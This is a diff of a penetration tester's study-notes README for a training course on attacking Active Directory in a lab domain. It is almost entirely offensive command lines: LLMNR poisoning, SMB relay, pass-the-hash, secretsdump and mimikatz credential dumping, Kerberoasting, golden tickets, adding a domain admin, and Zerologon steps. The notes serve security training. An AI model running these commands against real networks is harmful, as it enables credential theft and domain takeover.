@@ -1,4 +1,4 @@
-# Hi, I am Yerdaulet and my notes from PEH course.
+# Hi, I am Yerdaulet and my notes for PJPT.
 
 ## 🚀 About Me
 I am Junior Penetration Tester.
@@ -7,398 +7,277 @@ I am Junior Penetration Tester.
 [![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/yerdauletrash/)
 [![tryhackme](https://img.shields.io/badge/tryhackme-1DB954?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com/p/rashy)
 
+# Attacking Active Directory: Initial Attack Vectors
+LLMNR Poisoning attack.
 
-## Content
-- [Recon](#recon)
-- [Enumeration](#enumeration)
-- [Initial attacks](#initial-attacks-for-active-directory)
-- [Post Compromise Enumeration](#post-compromise-enumeration-for-active-directory)
+Steps
 
-- [Post Compromise Attacks](#post-compromise-attacks-for-active-directory)
-- [After Compromising Domain](#after-compromising-domain)
-- [Additional AD attacks](#additional-ad-attacks)
-- [AD Case Studies](#ad-case-studies)
-- [Certificate](#result)
-
-# Recon
-Introduction is here!
-
-![image1](images/image1.png)
-
-Discovering email addresses(links)=>
-
-https://hunter.io/
-
-https://phonebook.cz/
-
-https://www.voilanorbert.com/
-
-https://tools.emailhippo.com/
-
-https://email-checker.net/
-
-
-Gathering breached credentials=>
-
-https://github.com/hmaverickadams/breach-parse
-
-https://dehashed.com/
-
-Hunting Subdomains=>
-
-https://crt.sh/
-
+1.Run responder:
 ```bash
-sublist3r -d tesla.com -t 100
+sudo responder -I eth0 -dvw 
 ```
 
-Identifying website technologies=>
-
-https://builtwith.com/
-
-wappanalyzer tool
-
-```bash
-whatweb https://tesla.com
-```
-
-Google Dorking=>
-
-site:tesla.com  (returns results from only tesla.com website)
-
--www (remove results which have 'www' values)
-
-filetype:docx  (return results which filetype is docx.)
-
-# Enumeration
-```bash
-arp-scan -l  
-```
-
-```bash
-netdiscover -r 192.168.57.0/24
-```
-
-```bash
-nmap -T4 -p- -sS -A 192.168.57.134
-```
-
-# Initial attacks for Active Directory
-
-LLMNR Poisoning=>
-![LLMNR](images/image2.png)
-
-How to do=>
-
-1.Open responder:
-```bash
-responder -I tun0 -dwPv 
-```
-
-2.Write your ip as this format to search on File Explorer
+2.Attacker IP in File Explorer:
 ```bash 
-//attacker_ip
+//attacker ip
 ```
 
-3.Responder will give you result,you will crack in this way.
+3.Capturing a hash and cracking it:
 ```bash
-hashcat -m 5600 hash.txt /usr/share/wordlists  rockyou.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-SMB Relay=>
-For this attack works, SMB Signing must be **disabled**.
+SMB Relay attack.
 
-1.Checking SMB signing:
+1.Checking SMB signing with nmap:
+```
+nmap --script=smb2-security-mode.nse -p445 10.0.0.0
+```
+
+2.Switching off HTTP and SMB:
 ```bash
-nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
+sudo mousepad /etc/responder/Responder.conf
 ```
 
-2.Open responder:
+3.Run responder:
 ```bash
-responder -I tun0 -dwPv 
+sudo responder -I eth0 -dvw  
 ```
 
-3.Make configurations for responder tool here, '/etc/responder/Responder.conf'
-You need to **disable** (make OFF) HTTP and SMB
-
-4.Set up your relay
+4.Run ntlmrelayx.py 
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
-5.Write your ip as this format to search on File Explorer
+5.Attacker IP in File Explorer:
 ```bash 
-//attacker_ip
+//attacker ip
 ```
 
-Reminder! Run commands via ntlmrelayx.py
+Other ways.
+
+1.
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 ```
+2.
+```
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
 
-Gaining Shell Access=>
+nc 127.0.0.1 11000
+```
 
-First Way:
-We can use Metasploit for this.
+
+Gaining Shell Access.
+
+1st way:
+With Metasploit.
 ```bash
 use exploit/windows/smb/psexec
-set SMBDomain MARVEL.local
-set SMBUser fcastle
-set SMBPass Password1
+
+set SMBDOMAIN <Domain Name>
+
+set SMBUSER <User>
+
+set SMBPASS <Password>
 ```
 
-Second Way:
-We can use psexec.py to access
+2nd Way:
+With Metasploit and Administrator hash.
 ```bash
-psexec.py marver.local/fcastle:'Password1'@10.0.0.25
+use windows/smb/psexec
+
+set RHOSTS <IP> 
+
+set SMBUSER Administrator 
+
+set SMBPASS <NTLM Hash>
+
 ```
 
-Third way:
-Again, we use psexec.py to access , but with user's hashes (LM:NT), it is like Pass-The-Hash attack
+3rd Way and Manually:
+
 ```bash
-psexec.py administrator@10.0.0.25 --hashes [LM-HASH]:[NTLM-HASH]
+psexec.py MARVEL/fcastle:'Password1'@<ip> - Not a Loud as Metasploit
+
+psexec.py administrator@<ip> -hashes <NTLM Hash>
+
+smbexec.py administrator@<ip> -hashes <NTLM Hash>
+
+wmiexec.py administrator@<dip> -hashes <NTLM Hash>
 ```
 
-Fourth Way:
-If psexec.py doesn't work for third way,
-you need to use **wmiexec.py** as below.
+
+IPv6 DNS Takeover via mitm6
+
+1.Run ntlmrelayz.py:
 ```bash
-wmiexec.py administrator@192.168.138.137 --hashes [LM-HASH]:[NTLM-HASH]
+sudo ntlmprelayx.py -6 -t ldap://<domain controller ip> -wh fakewpad.marvel.local -l lootme
 ```
 
-
-IPv6 attacks=>
-
-1.Open **mitm6** for target domain
+2.Run mitm6:
 ```bash
 sudo mitm6 -d marvel.local
 ```
 
-2.At the same time, open **ntlmrelayx.py**
+3.Analyze Info from lootme file:
+
+
+# Attacking Active Directory: Post-Compromise Enumeration
+
+With Ldapdomaindump
+1.Run below command:
 ```bash
-ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
+sudo /usr/bin/ldapdomaindump ldaps://<domain_controller_ip> -u "MARVEL\fcastle" -p Password1
+```
+2.Analyze captured info:
+
+With BloodHound.
+1.Run below command:
+```bash
+sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <domain_controller_ip> -c all 
 ```
 
-3.You will get results like this from **'/home/kali/lootme/domain_computers.html'**
+2.Upload a file to Bloodhound GUI:
 
+With PlumHound
 
-# Post Compromise Enumeration for Active Directory
-
-Domain Enumeration with **ldapdomaindump**=>
-1.Run below command
+Neo4j and Bloodhound running
+1st Way:
 ```bash
-sudo ldapdomaindump ldaps://192.168.138.136 -u 'MARVEL\fcastle\' -p Password1
-```
-2.Then do **ls** command to see all things.
-
-Domain Enumeration with **bloodhound-python**=>
-1.Run below command
-**-ns option** means your DC(Domain Controller's IP)
-
-```bash
-sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns [DC-IP] -c all 
+sudo python3 PlumHound.py --easy -p <Password>
 ```
 
-2.Then do **ls** command to see all things.
-If you want to see via GUI, you just upload .json file into Bloodhound.
-
-Domain Enumeration with **Plumhound**=>
-
-When you do below command, **Bloodhound** should be up!
-1.
+2nd Way:
 ```bash
-sudo python3 PlumHound.py --easy -p [YOUR_PASS]
+sudo python3 PlumHound.py -x tasks/default.tasks -p <Password>
 ```
 
-2.Another thing for all.
-```bash
-sudo python3 PlumHound.py -x tasks/default.tasks -p [YOUR_PASS]
-```
+3.Anlyze Info.
 
-3.Finally, by opening Firefox, you can look at results.
+# Attacking Active Directory: Post-Compromise Attacks
 
-# Post Compromise Attacks for Active Directory
-
-Pass the Password=>
+Pass the Password:
 ```bash
 crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
 ```
 
-Grab some local hashes=>
-
-First Way:
-
-For this, we can use meterpreter by using hashdump.
+Dumping hashes with secretsdump:
 ```bash
-use windows/smb/psexec
-run
-hasdump #you will get hashes of users.
+secretsdump.py domain.local/fcastle:Password1@10.0.0.25
 ```
 
-Second Way:
+Dumping hashes with secretsdump and Admin:
 ```bash
-secretsdump.py MARVEL.local/fcastle:Password1@10.0.0.25
+secretsdump.py administrator:@10.0.0.25 --hashes <NTLM Hash>
 ```
 
-Third Way:
+Pass the Hash:
 ```bash
-secretsdump.py administrator:@192.168.138.138 --hashes [LM-HASH]:[NT-HASH]
+crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash>
 ```
 
-Pass the Hash=>
-```bash
-crackmapexec smb 10.0.0.0/24 -u administrator -H [USER-HASH]
+Crackmapexec's other commands and for more info use --help:
+
+--local-auth -  Authenticating locally
+```
+crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM HASH> --local-auth 
 ```
 
-Reminder! Cheatsheet of crackmapexec
+--sam - SAM Hashes 
+```
+crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM HASH> --local-auth --sam
 
---local-auth : authenticate locally to each target
-
---sam : dump SAM hashes from target systems.
-
---lsa : dump LSA secrets from target systems.
-
---shares: enumerate shares and access
-
--L : List available modules for each protocol
-
--M : Specify module
-
-How to use **available** module for crackmapexec?
-```bash
-crackmapexec smb 192.168.138.0/24 -u administrator -H [USER-HASH] --local-auth -M lsassy
+Accessing to Database
+cmedb
+    hosts
+    creds
 ```
 
-**Reminder**! If you want to access database of crackmapexec, you just need to use **cmedb** command
-
-
-
-Kerberoasting=>
-
-1.Get SPNs 
-```bash
-python GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip [DC_IP] -request
+--lsa - LSA Secrets 
+```
+crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash> --local-auth --lsa
 ```
 
-2.Crack the hash
+--shares - Shared Files
+```
+crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash> --local-auth --shares
+```
+
+-L - Checking modules
+
+-M - Module
+```
+crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash> --local-auth -M lsassy
+```
+
+Kerberoasting.
+
+1.Get a Kerboroas user's hash:
+```bash
+sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip <domain_controller_ip> -request
+```
+
+2.Cracking the hash:
 ```bash
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Token Impersonation=>
+Token Impersonation.
 
-To see all tickets on meterpreter
+1.Get a shell with Metasploit:
 ```bash
+meterpreter > load incognito
+
 meterpreter > list_tokens -u
+
+meterpreter > impersonate_token marvel\\fcastle
 ```
 
-To impersonate user:
-```bash
-meterpreter > impersonate_token MARVEL\\administrator
-```
-
-To dump hashes:
-```bash
-mimikatz(powershell) # privilege::debug
-mimikatz(powershell) # LSADump::LSA /patch
-```
-
-How to add a new user:
+Adding a User.
 ```powershell
 net user /add hawkeye Password1@ /domain
 ```
 
-How to add user into group:
+Adding a user into Domain Admins group.
 ```powershell
 net group "Domain Admins" hawkeye /ADD /DOMAIN
 ```
 
-GPP attack(cPassword attack)=>
-Sample Groups.xml file=>
-![image3](images/image3.jpg)
+Mimikatz.
 
-Cracking password=>
-![image4](images/image4.jpg)
+https://github.com/gentilkiwi/mimikatz
 
-
-Credential Dumping with Mimikatz=>
-
-Mimikatz:https://github.com/gentilkiwi/mimikatz
-
-Below command is must on Mimikatz!
+Run in Mimikatz:
 ```bash
 mimikatz # privilege::debug
 ```
-
-Reminder! When you write module_name then put "::" then , clicking Tab, you can get **HELP**
-
-1.sekurlsa : This module is used to enumerate credentials.
-Example:
+Dumping credentials:
 ```bash
 mimikatz # sekurlsa:logonPasswords
 ```
 
-# After compromising Domain
+Golden Ticket:
+```
+privilege::debug
+
+lsadump:lsa /inject /name:krbtgt - note sid and primary ntlm hash
+
+kerberos::golden /User:FAKE_USER /domain:marvel.local /sid:<sid> /krbtgt:<ntlm hash> /id:500 /ptt
+
+misc::cmd - opens command prompt 
+
+   dir \\THEPUNISHER\$c - accessing to every machine.
+```
+
+# Compromised the Domain
 
 Dumping NTDS.dit=>
 ```bash
-secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc-ntlm 
+secretsdump.py MARVEL.local/pparker:'Password2@'@<domain_controller_ip> -just-dc-ntlm
 ```
 
-Golden Ticket Attacks=>
-
-1.First, we get NTLM hash ,SID and relative ID of krbtgt account from KDC
-```bash
-mimikatz # privilege::debug
-mimikatz # lsadump::lsa /inject /name:krbtgt
-```
-
-2.Then using above creds, we just create golden ticket.
-```bash
-kerberos::golden /User:Administrator /domain:marvel.local /sid:[SID_VALUE] /krbtgt:[KRBTGT_NTLM_HASH] /id:[RELATIVE_ID] /ptt
-```
-
-# Additional AD attacks
-
-CVE-2020-1472=> This is Abusing **Zerologon**.
-
-URL=>https://github.com/SecuraBV/CVE-2020-1472
-
-How to do=>
-
-1.We get Administrator hash from here
-```bash
-secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132
-```
-
-2.Now ,we need to get 'plain_password_hex' by using hash in below format.
-```bash
-secretsdump.py administrator@192.168.138.132 --hashes [LM:NTLM_HASH]
-```
-
-3.Now, we use script from Github as below
-```bash
-python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.138.132 -hexpass [HEX_VALUE]
-```
-
-
-CVE-2021-1675=> This is **PrintNightmare**
-
-URL=https://github.com/cube0x0/CVE-2021-1675
-
-How to check this=> For this, we use rpcdump.py script
-```bash
-rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
-```
-
-# AD Case Studies
-
-Case 1: https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security
-Case 2: https://tcm-sec.com/pentest-tales-002-digging-deep
-
-# Post Exploitation
-
-File Transfers
+Transfering Files.
 
 1.Powershell for Windows
 ```powershell
@@ -407,9 +286,9 @@ certutil.exe --urlcache -certuil -f http://10.0.0.0/example.txt example.txt
 
 2.HTTP server to share files on directory
 ```bash
-python3 -m http.server [port]
+python3 -m http.server <port>
 ```
 
 # Result
-[Click me!](https://www.linkedin.com/feed/update/urn:li:activity:7172077875397967872/)
+[Certificate!](https://www.linkedin.com/feed/update/urn:li:activity:7172077875397967872/)
 
